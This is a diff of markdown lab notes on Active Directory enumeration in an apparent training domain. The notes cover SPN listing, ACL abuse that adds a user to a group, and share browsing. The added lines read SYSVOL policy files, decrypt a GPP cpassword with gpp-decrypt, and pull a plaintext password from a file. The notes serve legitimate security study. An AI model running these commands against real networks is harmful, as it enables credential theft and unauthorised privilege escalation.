@@ -2329,13 +2329,13 @@ Reference
     `PS C:\Tools\PSTools> .\PsLoggedon.exe \\web04` //might be false positive  
     `PS C:\Tools\PSTools> .\PsLoggedon.exe \\client74` //admin privilege  
 - Services Principals Names (SPN)
-  - Listing SPN linked to a certain user account > Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:
+  - Listing SPN linked to a certain user account > Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:  
     `c:\Tools>setspn -L iis_service`  
-  - Listing the SPN accounts in the domain > samaccountname serviceprincipalname
-    `PS C:\Tools> Get-NetUser -SPN | select samaccountname,serviceprincipalname` //{HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80}
-  - Resolving the web04.corp.com named > Address:  192.168.50.72
+  - Listing the SPN accounts in the domain > samaccountname serviceprincipalname  
+    `PS C:\Tools> Get-NetUser -SPN | select samaccountname,serviceprincipalname` //{HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80}  
+  - Resolving the web04.corp.com named > Address:  192.168.50.72  
     `PS C:\Tools\> nslookup.exe web04.corp.com`  
-- Object Permissions
+- Object Permissions (GenericAll - Full permission)
   - Running Get-ObjectAcl specifying our user > ObjectSID: S-1-5-21-1987370270-658905905-1781884369-1104; ActiveDirectoryRights: ReadProperty; SecurityIdentifier: S-1-5-21-1987370270-658905905-1781884369-553  
     `PS C:\Tools> Get-ObjectAcl -Identity stephanie`
   - use PowerView's Convert-SidToName command to convert it to an actual domain object name > CORP\stephanie  
@@ -2350,11 +2350,25 @@ Reference
     `PS C:\Tools> net group "Management Department" stephanie /add /domain`
   - Running "Get-NetGroup" to enumerate "Management Department" (verify if stephanie now added to the group)  > {CN=jen,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}  
     `PS C:\Tools> Get-NetGroup "Management Department" | select member`
-  - Using "net.exe" to remove ourselves from domain group
+  - Using "net.exe" to remove ourselves from domain group  
     `PS C:\Tools> net group "Management Department" stephanie /del /domain`
-  - ddd
-  - ddd
 - Domain Shares
+  - PowerView's Find-DomainShare > name, type, remark, computerName  
+    `PS C:\Tools> Find-DomainShare`  //DC1.corp.com，web04.corp.com，client74.corp.com
+  - Listing contents of the SYSVOL share (%SystemRoot%\SYSVOL\Sysvol\domain-name) > policies, scripts  
+    `PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\`
+  - Listing contents of the "SYSVOL\policies share" > oldpolicy  
+    `PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\Poli`
+  - Checking contents of old-policy-backup.xml file > cpassword="+bsY0..."  
+    `PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml`  
+  - Using gpp-decrypt to decrypt the password > P@$$w0rd  
+    `kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"`
+  - Listing the contents of docsare > docs  
+    `PS C:\Tools> ls \\FILES04\docshare`
+  - Listing the contents of do-not-share > start-email.txt  
+    `PS C:\Tools> ls \\FILES04\docshare\docs\do-not-share`
+  - Checking the "start-email.txt" file > password as well: HenchmanPutridBonbon11  
+    `PS C:\Tools> cat \\FILES04\docshare\docs\do-not-share\start-email.txt`
 
 **Automated enumeration**  
 - Collecting data with SharpHound
